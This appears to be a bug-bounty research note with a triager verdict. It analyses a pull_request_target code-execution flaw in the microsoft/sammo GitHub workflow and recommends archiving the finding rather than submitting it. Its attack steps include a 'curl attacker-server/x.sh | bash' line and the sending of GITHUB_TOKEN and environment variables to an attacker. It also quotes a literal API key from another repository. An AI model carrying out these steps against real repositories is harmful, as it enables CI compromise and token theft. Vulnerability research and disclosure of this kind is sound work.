# REPORT CANDIDATE — microsoft/sammo CI RCE via pull_request_target + default checkout

## Status: REPORT_CANDIDATE (needs dedup check before MSRC submission)

## Summary
`.github/workflows/build.yml` in the public **microsoft/sammo** repo triggers on
`pull_request_target` for ANY fork PR targeting main, checks out the
attacker-controlled PR head (plain `actions/checkout@v4`, no `ref:`), then runs
fork-controlled build scripts (`poetry install`, `poetry run poe pre-commit /
type-check / test / build-docs`, `pyproject-build`) on the base repo's CI runner
with the base repository's `GITHUB_TOKEN`. Arbitrary code execution in the CI
context of the microsoft org repo.

## Evidence (workflow, verified live from repo HEAD 2026-08-16)
```yaml
# .github/workflows/build.yml
on:
  push: { branches: [main] }
  pull_request_target:          # ← any fork PR (no label/maintainer/closed gate)
    branches: [main]
  release: ...
  workflow_dispatch:

jobs:
  build:
    runs-on: [ubuntu-latest, windows-latest, macos-latest]   # matrix
    # NO permissions: block → default GITHUB_TOKEN scope
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4          # ← NO ref: → under prt, checks out PR head = attacker code
      - run: poetry install --with dev      # executes fork's pyproject.toml
      - run: poetry run poe pre-commit      # executes fork-defined poe tasks
      - run: poetry run poe type-check
      - run: poetry run poe test -v
      - run: pyproject-build                # executes fork's build backend
      - run: poetry run poe build-docs
```
- Trigger matrix: ubuntu + windows + macos runners; 6 jobs × 3 OS = 18 runs per PR.
- No `permissions:` at workflow or job level for `build` → GITHUB_TOKEN = repo
  default (read-only for newer repos, write for older — org default applies).
- GitHub repo (public): https://github.com/microsoft/sammo — last commit
  2025-06-23 (repo still publicly visible; workflow still present at HEAD).

## Attack
1. Attacker forks microsoft/sammo.
2. Pushes a branch whose `pyproject.toml` defines a `poe` task `pre-commit`
   (or build backend) executing `curl attacker-server/x.sh | bash` or exfil of
   env vars (GITHUB_TOKEN, runner env) to attacker.
3. Opens a PR to main. `build.yml` auto-runs on the fork PR (no approval
   requirement visible in the workflow).
4. Attacker's code executes on GitHub-hosted runner in base repo context;
   GITHUB_TOKEN (contents read/write per default) available in env for exfil.

## Impact
- Arbitrary code execution in microsoft/sammo CI on all 3 runner OSes.
- If repo/org default GITHUB_TOKEN has `contents: write`: push to main,
  modify releases/tags, tamper with release artifacts → supply-chain risk for
  anyone installing the sammo package / reading the docs site.
- If read-only: still full runner takeover + any secrets/credentials the job
  context can reach (none explicitly referenced in build job today — impact
  then limited to code exec + token; still a CI/CD RCE class finding).
- Class: classic pwnrequest (pull_request_target RCE) — the #1 GitHub Actions
  vulnerability class (CVE-2025-30066 lineage / pwnrequest research).

## Scope
- microsoft GitHub org IS in scope for MSRC bounty (hunt-lab scope.yml:
  github_orgs: [microsoft]).

## Next steps / dedup
- [ ] Check MSRC GitHub bounty for prior reports on microsoft/sammo
      (dedup) before submitting.
- [ ] Confirm repo's default GITHUB_TOKEN scope is write (cannot verify
      externally; org default applies — submission should state both cases).
- [ ] PoC option (passive-safe): fork + PR with benign `poe pre-commit`
      echoing env var NAMES only (no exfil, no modification) — needs
      user approval before execution; do NOT run automated against
      microsoft org without approval.

## Fixed-reference sibling (non-issue, for the report's contrast section)
- google/heir/.github/workflows/docs.yml — prt + plain checkout, but PRs are
  NOT auto-approved... (actually heir prt has no gate either; its fallback
  BUILDBUDDY_API_KEY 'SEVzwPt2S7PHhY1OxD3u' is deliberately public for forks —
  by-design per in-repo comment).

---
## TRIAGER VERDICT (2026-08-16) — DO NOT SUBMIT as-is; KILL or archive as lead

### Facts that cap the severity
1. **Token is read-only.** Repo created 2023-12-04 (verified via repo page) → GitHub
   default GITHUB_TOKEN for workflows without a `permissions:` block =
   `contents: read`. Build job has NO permissions block (only the release jobs,
   lines 112/152, which are `release`-event-gated and NOT reachable from fork PRs).
   → No write impact (no push-to-main, no release tampering) is demonstrable.
2. **Zero secrets in the build job.** No `environment:`, no secret refs
   (verified: only `secrets.GITHUB_TOKEN` inside release-gated jobs).
   → Nothing exfiltratable beyond the read-only token + public code.
3. **Ephemeral GitHub-hosted runners.** ubuntu/windows/macos-latest = disposable,
   no org data, no persistence. Impact = compute abuse on free public runners.
4. **Known class, huge dedup surface.** pwnrequest (pull_request_target RCE)
   disclosed 2021, mass-reported in microsoft org since; GitHub's default
   mitigations (read-only tokens, first-contributor approval gate) already
   address the common path. MSRC sees this class constantly.
5. **Stale repo.** Last commit 2025-06-23 — 14 months silent. Research repo,
   likely "unmaintained" → MSRC may decline on that alone.

### What MSRC would need (and we cannot provide, passively)
- Proof of write access (repo write via token) — cannot verify externally;
  default says read-only.
- Proof of secret exposure — none exist in the job.
- A live PoC = opening a fork PR to a microsoft org repo = violates passive
  scope + MSRC's no-unsolicited-testing posture; also only beats the
  first-contributor gate after ONE maintainer approval on a stale repo.

### Verdict
- Severity honestly: **Low** (code exec on ephemeral runner, read-only token,
  no secrets). Real-world CVSS ≈ 5.0–6.5, but below MSRC's practical payout bar
  for CI/CD findings without secret/write impact.
- Recommendation: **DO NOT submit.** Archive as lead with re-open conditions:
  (a) repo becomes active again, (b) a secret is added to the build job,
  (c) a self-hosted runner appears, (d) evidence the org default token is write.
- If the user wants it fixed regardless of bounty: report via MSRC's
  "vulnerability disclosure" (not bounty) channel — informational, expect
  WontFix-or-fix with no payout.
